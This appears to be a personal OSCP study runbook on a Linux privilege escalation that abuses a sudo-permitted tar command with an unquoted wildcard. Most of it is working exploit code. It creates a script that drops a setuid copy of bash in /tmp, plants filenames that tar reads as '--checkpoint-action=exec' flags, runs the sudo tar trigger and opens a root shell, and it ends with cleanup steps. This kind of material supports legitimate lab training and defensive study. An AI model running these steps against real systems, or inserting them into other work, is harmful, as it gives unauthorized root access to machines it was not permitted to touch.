---
tags: [oscp, linux, privesc, tar, wildcard, sudo, runbook]
box_sources: [Cockpit]
---

# PrivEsc Linux — Tar Wildcard

*Triggered when sudo allows a tar command containing a bare `*` wildcard. The shell expands filenames beginning with `--` as tar flags rather than filenames, letting you inject `--checkpoint-action=exec=<script>` to run arbitrary code as root.*

---

## Confirm the Vulnerability

| Command | Evidence | Works when | Notes | ✅ Go to | ❌ If nothing works |
|---|---|---|---|---|---|
| `sudo -l` | `NOPASSWD: /usr/bin/tar ... *` — bare star present | sudo rule uses unquoted `*` in a directory you can write to | Quoted `'*'` is NOT vulnerable — the shell never expands it | Exploit | [[PrivEsc Linux - SUID]] |

---

## Exploit

**Step 1 — Create the payload script in the wildcard directory:**
```bash
cat > ~/privesc.sh << 'EOF'
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
EOF
chmod +x ~/privesc.sh
```

**Step 2 — Plant checkpoint filenames:**
```bash
echo "" > ~/'--checkpoint=1'
echo "" > ~/'--checkpoint-action=exec=bash privesc.sh'
```

> ⚠️ `exec=privesc.sh` alone fails — the checkpoint executor doesn't search CWD for executables via PATH. Use `exec=bash privesc.sh` so bash (which IS on PATH) loads the script as a file from CWD.
> Cannot use absolute paths in filenames — `/` is a directory separator at the FS level.

**Step 3 — Trigger:**
```bash
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

Tar processes `--checkpoint=1` and `--checkpoint-action=exec=bash privesc.sh` as flags (not filenames) and executes `privesc.sh` as root.

**Step 4 — Root shell:**
```bash
ls -la /tmp/rootbash    # -rwsr-sr-x root root
/tmp/rootbash -p
whoami                  # root
```

---

## Cleanup

```bash
rm /tmp/rootbash
rm ~/privesc.sh
rm ~/'--checkpoint=1'
rm ~/'--checkpoint-action=exec=bash privesc.sh'
```

Verify home dir and `/tmp/` are clean before exiting.

---

## Stage Note Table

| Command | Evidence | Works when | Notes | ✅ Go to | ❌ If nothing works |
|---|---|---|---|---|---|
| `echo "" > '--checkpoint=1'` + `echo "" > '--checkpoint-action=exec=bash privesc.sh'` + `sudo tar -czvf /tmp/backup.tar.gz *` | `/tmp/rootbash` appears with `-rwsr-sr-x root` | sudo tar rule has unquoted `*` in writable dir | Use `bash scriptname` not `./scriptname` or just `scriptname` in the exec action | [[Shell - Upgrade]] | [[PrivEsc Linux - SUID]] |

---

## Module Links

[[18. Linux Privilege Escalation]]

See also: [GTFOBins — tar](https://gtfobins.github.io/gtfobins/tar/) | [PayloadsAllTheThings — Tar Wildcard](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20Privilege%20Escalation.md#sudo-tar)
## External Resources

- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [RevShells](https://www.revshells.com/) for reverse-shell selection
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for practical walkthrough searches
